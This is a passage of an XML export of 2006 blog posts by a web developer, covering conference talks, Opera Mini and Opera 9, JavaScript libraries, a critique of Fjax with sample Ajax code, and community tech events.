		<field name="body">&lt;p id=&quot;p-0&quot;&gt;I've been doing a fair amount of public speaking recently, based on the principle that the only way to get good at it is to get a lot of practise. My last two talks were a session on &lt;a href=&quot;http://accu.org/index.php/conferences/2006/schedule/schedule_060420#t12a&quot;&gt;Django and Web Application Frameworks&lt;/a&gt; at the &lt;a href=&quot;http://accu.org/index.php/conferences/2006/&quot;&gt;ACCU 2006 conference&lt;/a&gt; and a talk on the &lt;a href=&quot;http://developer.yahoo.com/&quot;&gt;Yahoo! Developer Network&lt;/a&gt; for NMK's &lt;a href=&quot;http://www.nmk.co.uk/event/2006/04/27/beers-innovation-mashup&quot;&gt;Beers and Innovation series&lt;/a&gt;.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;I've got a bunch more coming up. Here's my calendar for the next few months:&lt;/p&gt;

&lt;h4&gt;&lt;a href=&quot;http://xtech06.usefulinc.com/&quot;&gt;XTech 2006&lt;/a&gt;, May 16th-19th in Amsterdam&lt;/h4&gt;

&lt;p id=&quot;p-2&quot;&gt;I'm chairing the &lt;a href=&quot;http://xtech06.usefulinc.com/content/ajax&quot;&gt;Ajax Developers' Day&lt;/a&gt;, during which I'll also be giving a talk about the &lt;a href=&quot;http://developer.yahoo.com/yui/&quot;&gt;Yahoo! UI Library&lt;/a&gt;. The line-up for the day is pretty impressive, including representatives from a number of high-profile Ajax projects and a keynote by &lt;a href=&quot;http://alex.dojotoolkit.org/&quot;&gt;Alex Russell&lt;/a&gt;. I'm also giving &lt;a href=&quot;http://xtech06.usefulinc.com/schedule/detail/140&quot;&gt;a talk on Django&lt;/a&gt; later in the conference.&lt;/p&gt;

&lt;h4&gt;&lt;a href=&quot;http://london.pm.org/ljs-200605/&quot;&gt;London JavaScript Night&lt;/a&gt;, May 25th, London&lt;/h4&gt;

&lt;p id=&quot;p-3&quot;&gt;This is &lt;q cite=&quot;http://london.pm.org/ljs-200605/&quot;&gt;a night of talks that are in someway related to the JavaScript language&lt;/q&gt;. I'm giving an overview of the most important JavaScript libraries, how they compare and the general problems that they are trying to solve. The organisers are still looking for speakers, so drop them a line if you have something to share.&lt;/p&gt;

&lt;h4&gt;&lt;a href=&quot;http://www.vivabit.com/atmedia2006/&quot;&gt;@media 2006&lt;/a&gt;, June 15th-16th, London&lt;/h4&gt;

&lt;p id=&quot;p-4&quot;&gt;I'm on &lt;a href=&quot;http://www.vivabit.com/atmedia2006/sessions/#dom&quot;&gt;a panel&lt;/a&gt; with Cameron Adams, Peter-Paul Koch, Stuart Langridge and Dan Webb talking about the benefits (and drawbacks) of JavaScript libraries.&lt;/p&gt;

&lt;p id=&quot;p-5&quot;&gt;I'm also hoping to speak at &lt;a href=&quot;http://www.lugradio.org/live/2006/index.php/Main_Page&quot;&gt;LUG Radio Live&lt;/a&gt; in July and &lt;a href=&quot;http://www.clearleft.com/dconstruct06/&quot;&gt;d.Construct 2006&lt;/a&gt; in September, topics undecided.&lt;/p&gt;

&lt;p id=&quot;p-6&quot;&gt;Finally, I'm heading to a couple of geeky social events this week: &lt;a href=&quot;http://www.pubstandards.co.uk/2006/04/25/pub-standards-7-tuesday-2nd-may-2006/&quot;&gt;Pub Standards&lt;/a&gt; on Tuesday and &lt;a href=&quot;http://www.magpiebrain.com/blog/2006/04/18/london-20-rc-5-wednesday-may-3rd/&quot;&gt;London 2.0 RC 5&lt;/a&gt; (the monthly Django/Python/Rails/Everything-else meetup) on Wednesday. Both events are fun, friendly and open to all.&lt;/p&gt;</field>
		<field name="created">2006-05-01 23:23:21</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1526</field>
		<field name="title">Opera Mini 2.0</field>
		<field name="slug">operamini</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;Just as I was getting thoroughly sick of the whole X-2.0 trend along comes a product I can really get excited about. &lt;a href=&quot;http://www.opera.com/products/mobile/operamini/&quot;&gt;Opera Mini 2.0&lt;/a&gt; is a truly lovely piece of software. It's a free web browser for your phone, accompanied by a free proxy:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.opera.com/products/mobile/operamini/faq/&quot;&gt;&lt;p id=&quot;p-1&quot;&gt;When surfing with Opera Mini, Web pages are optimized and compressed before being sent to your phone. This means that even though your mobile provider may charge you for the data which is transferred to your phone, the amount of data transferred is significantly less than it would normally be, making mobile surfing cheaper.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p id=&quot;p-2&quot;&gt;Most UK mobile data plans are pretty extortionate. I was quoted over £500 a month for an unlimited plan recently; compare that to &lt;a href=&quot;http://randomfoo.net/&quot;&gt;Leonard Lin&lt;/a&gt; who pays $15 a month in the US. Having a compressing proxy is essential.&lt;/p&gt;

&lt;p id=&quot;p-3&quot;&gt;In stark contrast to the desktop edition the user interface is beautifully simple, relying mostly on the joypad to navigate with a full-screen editor for entering URLs and filling in forms. Opera's &lt;a href=&quot;http://www.opera.com/products/mobile/smallscreen/&quot;&gt;small screen rendering technology&lt;/a&gt; is used to linearise the page content while keeping background colours and images intact.&lt;/p&gt;

&lt;p id=&quot;p-4&quot;&gt;The one feature I'd love to see added is a &quot;reload page with images&quot; menu option. I generally browse with images turned off, and viewing a page with its images requires me to navigate to the settings screen, toggle images on, reload the page and then remember to turn images back off again afterwards.&lt;/p&gt;

&lt;p id=&quot;p-5&quot;&gt;Opera Mini doesn't appear to support JavaScript, but despite that nearly all the sites I've visited have been perfectly usable. Even Gmail works, thanks to an automatic fallback to their plain-old-HTML interface. With any luck it will become part of the accepted accessibility benchmark - I know I'll be testing sites with it in the future.&lt;/p&gt;</field>
		<field name="created">2006-05-11 22:12:25</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1527</field>
		<field name="title">Notes from my Yahoo! UI Library talk</field>
		<field name="slug">yahooui</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;I gave my talk on the Yahoo! User Interface Library here at &lt;a href=&quot;http://xtech06.usefulinc.com/&quot;&gt;XTech&lt;/a&gt; on Tuesday. There's so much great stuff in the library that cramming it all in to 45 minutes proved impossible, so I ended up focusing on the utilities (dom, event, connection, animation and dragdrop) and providing an overview of the controls at the end.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;As with &lt;a href=&quot;http://simon.incutio.com/archive/2006/03/07/etech&quot;&gt;my JavaScript tutorial at ETech&lt;/a&gt; I made written notes before starting to compile the slides. The notes are incomplete (they abruptly end half way through the dragdrop section - at which point I decided to concentrate on putting the slides together) but should still be useful for people who haven't looked at the Library in detail:&lt;/p&gt;

&lt;p id=&quot;p-2&quot;&gt;&lt;a href=&quot;http://simon.incutio.com/slides/2006/xtech/yui-notes.html&quot;&gt;Preparatory notes for &quot;The Yahoo! User Interface Library&quot;&lt;/a&gt;&lt;/p&gt;

&lt;p id=&quot;p-3&quot;&gt;I've also uploaded &lt;a href=&quot;http://simon.incutio.com/slides/2006/xtech/yui-slides.pdf&quot;&gt;the slides&lt;/a&gt; as a 240 KB PDF.&lt;/p&gt;</field>
		<field name="created">2006-05-18 13:48:22</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1528</field>
		<field name="title">Web APIs, not Web Services</field>
		<field name="slug">webapis</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;In &lt;a href=&quot;http://www.mnot.net/blog/2006/05/25/web_services&quot;&gt;Web Services are Dead, Long Live Web Services&lt;/a&gt;, Mark Nottingham suggests HTTP Web Services as a better phrase for discussing machine-to-machine communication using HTTP where the WS-* stack isn't assumed.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;I'd go a step further and say that the word &quot;services&quot; is ambiguous and confusing. I've met people who think that a Web Service is any application that you access over the Web - and it's easy to understand their confusion.&lt;/p&gt;

&lt;p id=&quot;p-2&quot;&gt;I propose &lt;dfn&gt;Web APIs&lt;/dfn&gt; as a better alternative. They're APIs that you call over the Web. No &lt;a href=&quot;http://www.loudthinking.com/arc/000585.html&quot;&gt;Deathstar&lt;/a&gt; required.&lt;/p&gt;

&lt;p id=&quot;p-3&quot;&gt;&lt;strong&gt;Update:&lt;/strong&gt; Joe Gregorio &lt;a href=&quot;http://bitworking.org/projects/XML2005/presentation/atom-publishing-protocol.html#slide14&quot;&gt;argues against the term API&lt;/a&gt; in this presentation from last year.&lt;/p&gt;</field>
		<field name="created">2006-05-26 09:22:57</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1529</field>
		<field name="title">EasyEclipse</field>
		<field name="slug">easyeclipse</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;Back in November of 2004 I posted &lt;a href=&quot;http://simon.incutio.com/archive/2004/11/27/eclipse&quot;&gt;a rant&lt;/a&gt; about how difficult it was to download and install the Eclipse IDE from &lt;a href=&quot;http://www.eclipse.org/&quot; title=&quot;Eclipse.org&quot;&gt;the official site&lt;/a&gt;. I'm delighted to hear that my rant was partially responsible for the creation of the &lt;a href=&quot;http://www.easyeclipse.org/&quot;&gt;EasyEclipse&lt;/a&gt; project, which not only provides easily installable packages for setting up a Java development environment but also covers &lt;a href=&quot;http://www.easyeclipse.org/site/distributions/lamp.html&quot;&gt;LAMP development&lt;/a&gt; as well.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;Meanwhile, &lt;a href=&quot;http://www.eclipse.org/&quot;&gt;eclipse.org&lt;/a&gt; has made big improvements too. A visit to &lt;a href=&quot;http://www.eclipse.org/downloads/&quot;&gt;www.eclipse.org/downloads&lt;/a&gt; gives me a nice big &quot;Download now: Eclipse SDK 3.1.2, Mac OS X (98 MB)&quot; link, with an alternative link to the torrents.&lt;/p&gt;

&lt;p id=&quot;p-2&quot;&gt;I'm living in &lt;a href=&quot;http://macromates.com/&quot;&gt;TextMate&lt;/a&gt; at the moment and loving every minute of it, but I'll certainly be trying out one of the EasyEclipse distributions next time I need to work with Java.&lt;/p&gt;</field>
		<field name="created">2006-06-03 11:34:52</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1530</field>
		<field name="title">Two revolutionary features in Opera 9</field>
		<field name="slug">opera9</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;Wow, if I'm not careful this is going to turn in to &lt;a href=&quot;http://simon.incutio.com/archive/2006/05/11/operamini&quot; title=&quot;Opera Mini 2.0&quot;&gt;a promotional blog for Opera&lt;/a&gt;.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;So, I've been playing with &lt;a href=&quot;http://my.opera.com/welcome%20to%209/blog/show.dml/306342&quot; title=&quot;Welcome to Opera 9&quot;&gt;Opera 9&lt;/a&gt; which came out earlier today (in a dual release for Windows and Mac, which is refreshing). It's an impressive package - it's fast, it renders every page I've throw at it so far, it passes &lt;a href=&quot;http://www.webstandards.org/action/acid2&quot;&gt;Acid 2&lt;/a&gt;, supports Canvas and &lt;a href=&quot;http://www.opera.com/features/svg/&quot;&gt;SVG&lt;/a&gt; and has a neat &lt;a href=&quot;http://widgets.opera.com/&quot;&gt;widgets&lt;/a&gt; implementation. Performance on &lt;a href=&quot;http://maps.google.com/&quot;&gt;Google Maps&lt;/a&gt; is a bit sluggish but other than that it's been extremely snappy. The tab screenshot thumbnails are a nice touch.&lt;/p&gt;

&lt;p id=&quot;p-2&quot;&gt;There are two features however that set it head and shoulders above its competitors in terms of raw utility:&lt;/p&gt;

&lt;ol&gt;
 &lt;li&gt;&lt;p id=&quot;p-3&quot;&gt;&lt;strong&gt;You can browse cached documents offline!&lt;/strong&gt; I'm not sure when other browsers forgot how to do this but it's been years since I've been able to unplug from the network and still view pages that have been saved in my cache.&lt;/p&gt;
 
&lt;p id=&quot;p-4&quot;&gt;In fact, this feature is almost too effective: I had to keep double-checking to make sure my WiFi was definitely turned off. A visual indicator that you are viewing an offline document would be a very useful addition.&lt;/p&gt;&lt;/li&gt;

 &lt;li&gt;&lt;p id=&quot;p-5&quot;&gt;&lt;strong&gt;You can quit your browser and reopen it to the same state.&lt;/strong&gt; Other browsers have been slow to cotton on to the fact that my browser state is important data - I frequently leave interesting pages open for days at a time and a browser crash causes me real pain. Safari and Firefox both have extensions that enable this but it's great to see it built in to the core product.&lt;/p&gt;
 
 &lt;p id=&quot;p-6&quot;&gt;Sadly, Opera doesn't persist partially completed form data (so you'll still lose that half-written blog entry if you weren't smart enough to write it in a text editor and paste it in at the last moment) but it's still a huge improvement over the rest.&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p id=&quot;p-7&quot;&gt;As far as I can tell those two features have been in Opera since before the current release, but I'd never noticed them before. Here's hoping other browser manufacturers follow suit.&lt;/p&gt;

&lt;p id=&quot;p-8&quot;&gt;While the interface is leaps and bounds ahead of Opera 6/7, it still has a few crufty edges: the preferences are hard to navigate, the text in the tab screenshot window comes across as an afterthought, there's a randomly placed recycle bin in the upper right hand corner and it took me a while to find a skin I liked (tango cl). The default behaviour for command-clicking a link is to open a new tab and switch to it; my preference is for opening in the background but I can't work out how to change that option (though shift-command-click does what I want). Overall though it rates extremely well.&lt;/p&gt;

&lt;p id=&quot;p-9&quot;&gt;As usual, it's worth looking over the detailed changelogs (&lt;a href=&quot;http://www.opera.com/docs/changelogs/windows/900/&quot; title=&quot;Changelog for Opera 9.0 for Windows&quot;&gt;windows&lt;/a&gt;, &lt;a href=&quot;http://www.opera.com/docs/changelogs/mac/900/&quot; title=&quot;Changelog for Opera 9.0 for Macintosh&quot;&gt;mac&lt;/a&gt;). There are some real gems for scripters; Here's the list in full:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.opera.com/docs/changelogs/mac/900/&quot;&gt;
&lt;ul&gt;
  &lt;li&gt;Added support for XSLT 1.0 and the XSLTProcessor constructor.&lt;/li&gt;
  &lt;li&gt;Added support for XPath 1.0.&lt;/li&gt;
  &lt;li&gt;Added support for DOM level 2 Style Sheets and associated parts of DOM level 2 CSS.&lt;/li&gt;
  &lt;li&gt;Implemented designMode for rich text editing.&lt;/li&gt;
  &lt;li&gt;Added support for the &lt;code&gt;CONTENTEDITABLE&lt;/code&gt; attribute and contentEditable property.&lt;/li&gt;
  &lt;li&gt;Implemented support for canvas, as described in the &lt;a href=&quot;http://whatwg.org/specs/web-apps/current-work/#scs-dynamic&quot;&gt;Web Applications 1.0 draft&lt;/a&gt;, as well as the &lt;a href=&quot;http://my.opera.com/WebApplications/blog/show.dml/200788&quot;&gt;opera-2dgame context&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;Added support for Audio, as described in the &lt;a href=&quot;http://whatwg.org/specs/web-apps/current-work/#scs-sound&quot;&gt;Web Applications 1.0 draft&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;Multiple improvements to XMLHttpRequest support.&lt;/li&gt;
  &lt;li&gt;Added support for onmousewheel events.&lt;/li&gt;
  &lt;li&gt;Added support for document.load and document.adoptNode.&lt;/li&gt;
  &lt;li&gt;Added window.getSelection and associated methods.&lt;/li&gt;
  &lt;li&gt;Improved handling of offsetTop, offsetLeft, and offsetParent.&lt;/li&gt;
  &lt;li&gt;Removed support for &quot;javascript:&quot; URLs in CSS.&lt;/li&gt;
  &lt;li&gt;Pages using certain JavaScript events will reload when visited in history. A &lt;a href=&quot;http://www.opera.com/support/search/supsearch.dml?index=827&quot;&gt;knowledge base article&lt;/a&gt; is available.&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;

&lt;p id=&quot;p-10&quot;&gt;I'm going to use Opera 9 as my default browser for the next week or so to see how well it holds up. I'll report back on the experience later.&lt;/p&gt;</field>
		<field name="created">2006-06-20 23:42:18</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1531</field>
		<field name="title">Fjax: Just say no</field>
		<field name="slug">fjax</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;To my utter amazement, a decent amount of buzz appears to be building around a new &quot;technology&quot; called &lt;a href=&quot;http://www.fjax.net/&quot;&gt;Fjax&lt;/a&gt; - much of it centred around &lt;a href=&quot;http://www.webmonkey.com/06/25/index4a.html&quot; title=&quot;Webmonkey Q&amp;amp;A: Fjax&quot;&gt;this interview on Webmonkey&lt;/a&gt;, but also benefiting from &lt;a href=&quot;http://radar.oreilly.com/archives/2006/06/fjax_ajax_with_flash.html&quot; title=&quot;FJAX: Ajax with Flash&quot;&gt;a mention&lt;/a&gt; on the O'Reilly Radar and of course the &lt;a href=&quot;http://digg.com/programming/FJAX_(Flash_AJAX)&quot; title=&quot;FJAX (Flash + AJAX)&quot;&gt;obligatory Digg story&lt;/a&gt;.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;Here's the catch: Fjax solves a non-existent problem. Here's the description from &lt;a href=&quot;http://www.fjax.net/?x=lnkExecutiveSummary.xml&quot;&gt;the site&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.fjax.net/?x=lnkExecutiveSummary.xml&quot;&gt;&lt;p id=&quot;p-2&quot;&gt;
Fjax is the lightweight, cross-browser, rapid-development methodology for Ajax-style web 2.0 development that puts a Flash engine under the hood (not in the presentation layer - read on) to handle realtime XML/HTML content updating.&lt;/p&gt;

&lt;p id=&quot;p-3&quot;&gt;Fjax enables web 2.0 development, with true, asynchronous (x)HTML content updating without page refreshes. The trick is, it does it with less than 65 lines of code and works in most browsers. It can process multiple streams of data simultaneously, and has an incredibly small footprint (4K!).
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p id=&quot;p-4&quot;&gt;So what does it actually do? It offers a replacement for the native browser XMLHttpRequest object that is slower, less fully-featured and does a bunch of crazy extra work behind the scenes. Ajax requests are instead made through an invisible Flash file that uses Flash to load the data, parse the XML, extract some CDATA and pass it back to JavaScript to replace a div.&lt;/p&gt;

&lt;p id=&quot;p-5&quot;&gt;Kind of like Prototype's &lt;a href=&quot;http://wiki.script.aculo.us/scriptaculous/show/Ajax.Updater&quot;&gt;Ajax.Updater&lt;/a&gt; then.&lt;/p&gt;

&lt;p id=&quot;p-6&quot;&gt;Why would you do this? According to the authors, doing this with JavaScript requires painful code forking. It certainly does if you write JavaScript like they do:&lt;/p&gt;

&lt;blockquote&gt;&lt;pre&gt;&lt;code&gt;
if (document.all) {
  //isIE
  document.all[ThisOutputDivID].innerHTML = objFjax;
} else {
  //isNotIE
  document.getElementById(ThisOutputDivID).innerHTML = objFjax;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/blockquote&gt;

&lt;p id=&quot;p-7&quot;&gt;(The &lt;code&gt;document.all&lt;/code&gt; workaround is only needed by IE 4 - every subsequent IE version has supported &lt;code&gt;document.getElementById&lt;/code&gt;, part of the DOM specification.)&lt;/p&gt;

&lt;p id=&quot;p-8&quot;&gt;They also claim that using Flash to load and parse XML is substantially faster than the native alternative:&lt;/p&gt;

&lt;blockquote&gt;&lt;p id=&quot;p-9&quot;&gt;And of course, this stuff is SPEEDY. Vastly reduced code, crazy fast parsing &amp;amp; delivery, quick load/unload, and multiple simultaneous data streams means your final applications have some serious pep.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p id=&quot;p-10&quot;&gt;They haven't done any benchmarks and I haven't either - but I would be amazed if this claim held up. Simply sending data between Flash and JavaScript is notoriously slow (see Brad &lt;a href=&quot;http://codinginparadise.org/weblog/2006/04/now-in-browser-near-you-offline-access.html&quot;&gt;Neuberg's writeup&lt;/a&gt;) and I've heard bad thing's about Flash's XML parsing speed too. Not that they are really using any of the capabilities of XML - the actual data used to update the page is handed back in &lt;a href=&quot;http://www.fjax.net/content/Fjax_Content1.xml&quot;&gt;one big CDATA block&lt;/a&gt;.&lt;/p&gt;

&lt;p id=&quot;p-11&quot;&gt;The &lt;a href=&quot;http://www.fjax.net/?x=lnkExecutiveSummary.xml&quot;&gt;executive summary&lt;/a&gt; builds its case on the idea that JavaScript is inconsistent, buggy and slow to develop. Bizarrely, making simple XMLHttpRequest calls (of the kind that Fjax is meant to replace) is one of the few parts of modern JavaScript for which that isn't true. The following is all the browser-forking code you need to cover every available major browser.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;function createXMLHttpRequest() {
  if (typeof XMLHttpRequest != 'undefined') {
    return new XMLHttpRequest();
  }
  try {
    return new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;);
  } catch (e) {
    try {
      return new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);
    } catch (e) { }
  }
  return false;
}&lt;/code&gt;&lt;/pre&gt;

&lt;p id=&quot;p-12&quot;&gt;They boast that Fjax uses only 65 lines of JavaScript (plus 4KB of Flash). The equivalent functionality in pure JavaScript, including the above browser workaround, runs to less than half of that:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;function ajaxUpdate(url, id) {
  var xmlhttp = createXMLHttpRequest();
  if (xmlhttp) {
    xmlhttp.onreadystatechange = function() {
      if (xmlhttp.readyState == 4 &amp;amp;&amp;amp; xmlhttp.status == 200) {
        document.getElementById(id).innerHTML = xmlhttp.responseText;
      }
    }
    xmlhttp.open(&quot;GET&quot;, url, true);
    xmlhttp.send(null);
  }
}&lt;/code&gt;&lt;/pre&gt;

&lt;p id=&quot;p-13&quot;&gt;Another quote:&lt;/p&gt;

&lt;blockquote&gt;&lt;p id=&quot;p-14&quot;&gt;
Using a Flash engine for XML parsing and (x)HTML content delivery reduces approximately 90% of the redundant cross-browser-supporting XML-related code usually associated with standard Ajax development. That in itself is HUGE.
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p id=&quot;p-15&quot;&gt;That 90% looks like a rectal approximation to me.&lt;/p&gt;

&lt;p id=&quot;p-16&quot;&gt;In its present form, Fjax offers absolutely nothing of value to front end developers. Even the idea of using invisible Flash components to make new functionality available to JavaScript isn't a new one - &lt;a href=&quot;http://codinginparadise.org/weblog/2006/04/now-in-browser-near-you-offline-access.html&quot;&gt;dojo.storage&lt;/a&gt; takes advantage of Flash's ability to store large amounts of data in an offline cache, while &lt;a href=&quot;http://blog.monstuff.com/FlashXMLHttpRequest&quot;&gt;FlashXMLHttpRequest&lt;/a&gt; makes cross-domain HTTP requests possible. There's a lot to be said for using Flash in this way (I'd love to see someone make the Flash accessibility APIs available to JavaScript), but Fjax is not a useful demonstration.&lt;/p&gt;

&lt;p id=&quot;p-17&quot;&gt;I'm not normally given to debunking crazy technology ideas - mainly because there are so many out there that it would be a full-time job - but this thing is so obviously broken I thought it best to try and nip it in the bud.&lt;/p&gt;

&lt;p id=&quot;p-18&quot;&gt;One last thing: their technique doesn't work in either Opera 9/Mac or Konqueror, both of which support vanilla Ajax just fine.&lt;/p&gt;

&lt;p id=&quot;p-19&quot;&gt;&lt;strong&gt;Update:&lt;/strong&gt; Steve McDonald, one of the Fjax authors, has posted &lt;a href=&quot;http://radar.oreilly.com/archives/2006/06/fjax_ajax_with_flash.html#c115463&quot;&gt;a follow-up comment&lt;/a&gt; on the O'Reilly Radar entry. He argues that the getVariable API they are using avoids the performance issues communicating between Flash and JavaScript (I have not verified this) and points out that code-forking for XML parsing is more likely with complex documents (that's why I like &lt;a href=&quot;http://www.json.org/&quot;&gt;JSON&lt;/a&gt;). They have removed the 90% claim from the site.&lt;/p&gt;</field>
		<field name="created">2006-06-25 15:03:53</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1532</field>
		<field name="title">Notes on JavaScript Libraries</field>
		<field name="slug">libraries</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.vivabit.com/atmedia2006/&quot;&gt;@media 2006&lt;/a&gt; was a blast. Great talks, great people and some of the highest production values I've ever seen at a conference (check out &lt;a href=&quot;http://www.flickr.com/search/?q=atmedia2006+bags&quot;&gt;the bags&lt;/a&gt;!).&lt;/p&gt;

&lt;p&gt;I sat on the &lt;a href=&quot;http://www.vivabit.com/atmedia2006/sessions/#dom&quot;&gt;JavaScript Libraries: Friend or Foe?&lt;/a&gt; panel, with PPK, Dan Webb, Stuart Langridge and Cameron Adams chairing. It was my first participation in a panel and I really enjoyed it - I've always liked the Q&amp;amp;A bit of giving talks. JavaScript Libraries are an enormous topic but I felt we did them justice considering the time available. For the record, here are the key points that I wanted to get across:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Large JavaScript applications need some kind of library&lt;/strong&gt; - even if it's one built especially for that application. There are a number of problems in JavaScript (most of them originating with browser incompatibilities) that any moderately complex application will need to deal with - things like normalised event handling, DOM node selection, sane animation or drag and drop. Solve these problems once so you can get on to the interesting task of building the application. If you can find a library that solves them for you so much the better!&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;The big four.&lt;/strong&gt; &lt;a href=&quot;http://dojotoolkit.org/&quot;&gt;Dojo&lt;/a&gt;, &lt;a href=&quot;http://mochikit.com/&quot;&gt;MochiKit&lt;/a&gt;, &lt;a href=&quot;http://prototype.conio.net/&quot;&gt;Prototype&lt;/a&gt;/&lt;a href=&quot;http://script.aculo.us/&quot;&gt;Scriptaculous&lt;/a&gt; and the &lt;a href=&quot;http://developer.yahoo.com/yui/&quot;&gt;Yahoo! UI Library&lt;/a&gt; are the top of the pile as far as I'm concerned. They cover the bases effectively and each one offers something interesting that makes it worth studying in its own right. If you plan to evaluate some existing libraries these make an excellent starting point.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Leaky abstractions.&lt;/strong&gt; Joel Spolsky's essay &lt;a href=&quot;http://www.joelonsoftware.com/articles/LeakyAbstractions.html&quot;&gt;The Law of Leaky Abstractions&lt;/a&gt; is my favourite of all of his online articles. It's basic tenet is that abstractions that are designed to save the programmer time inevitably leak, and if they leak at a lower level of abstraction than the programmer is familiar with they prove almost impossible to debug. Paradoxically, the more time saving abstractions you are using the more you actually have to know.&lt;/p&gt;

&lt;p&gt;JavaScript is possibly the leakiest abstraction of them all, thanks to the many different browser environments it runs in. If you rely on a library to abstract away the browser bugs from you you are certain to run in to a bug that you can't fix sooner or later. Don't use libraries as crutches; if you're not prepared to figure out what the library is doing for you you'll end up in a world of pain further down the line.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Community and documentation matter.&lt;/strong&gt; As with all open-source software, it's a good idea to get a feel for the amount of community activity around a project before you commit to building on it. The big four all have active communities, which means less bugs, more support and a faster rate of improvement. Likewise, good documentation is invaluable.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Libraries should play well with others.&lt;/strong&gt; Reusable code that excludes other code from being reused has severely limited long-term value. In JavaScript, that means that libraries that mess with Object.prototype or pollute global namespaces should be treated with caution. The Prototype library was a major culprit here, but thankfully has cleaned up its act (at least with regards to altering Object.prototype) in recent releases. It's all very well saying that you'll always be using code built with your core language modifications in mind, but you may well change your tune when you try to incorporate Yahoo! or Google Maps and everything breaks.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Go with the grain.&lt;/strong&gt; If you take the time to learn it properly, JavaScript is a powerful and surprisingly elegant language. Good JavaScript code takes advantage of its dynamic, functional nature. Libraries that promise to take the pain out of JavaScript by &lt;a href=&quot;http://code.google.com/webtoolkit/&quot; title=&quot;The Google Web Toolkit&quot;&gt;writing the code for you&lt;/a&gt; probably aren't as smart as they seem.  Abstractions leak.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Dan Webb has &lt;a href=&quot;http://www.sitepoint.com/article/javascript-library&quot;&gt;a good comparison of the big four&lt;/a&gt; on SitePoint, although he did overlook &lt;a href=&quot;http://developer.yahoo.com/yui/animation/&quot;&gt;YUI's Animation library&lt;/a&gt; which I consider a highlight.&lt;/p&gt;

&lt;p&gt;For more accurate coverage of the @media panel itself, take a look at my co-worker Paul Hammond's &lt;a href=&quot;http://www.paulhammond.org/2006/06/atmedia2/javascript&quot;&gt;detailed notes&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2006-06-26 15:03:00</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1533</field>
		<field name="title">LUG Radio Live and Ask Later</field>
		<field name="slug">events</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;I attended two grassroots technology events in the past two weeks: &lt;a href=&quot;http://www.lugradio.org/live/2006/&quot;&gt;LUG Radio Live 2006&lt;/a&gt; and London &lt;a href=&quot;http://www.asklater.com/steve/blog/?p=56&quot;&gt;Ask Later&lt;/a&gt; (previously known as Techa Kucha night, name &lt;a href=&quot;http://www.tom-carden.co.uk/2006/07/26/techa-kucha-night-becomes-ask-later/&quot;&gt;changed&lt;/a&gt; after some emails from the holders of the UK Pecha Kucha trademark). Both were excellent events in their own right, and great examples of event organisation done on a small to non-existent budget.&lt;/p&gt;

&lt;h3&gt;LUG Radio Live&lt;/h3&gt;

&lt;p id=&quot;p-1&quot;&gt;LUG Radio Live was held in Wolverhampton for the second year running, this time hosted by the Student Union. The event was twice the size of last year and will probably have to move to Birmingham in the future as Wolverhampton is running out of large enough venues.&lt;/p&gt;

&lt;p id=&quot;p-2&quot;&gt;This year there were around 400 attendees and the event was stretched out over two days. The venue was almost ideal: a good main stage, two separate rooms for &quot;lightning talk&quot; tracks (probably the wrong name for sessions that were generally half an hour long) and of course a well-stocked bar.&lt;/p&gt;

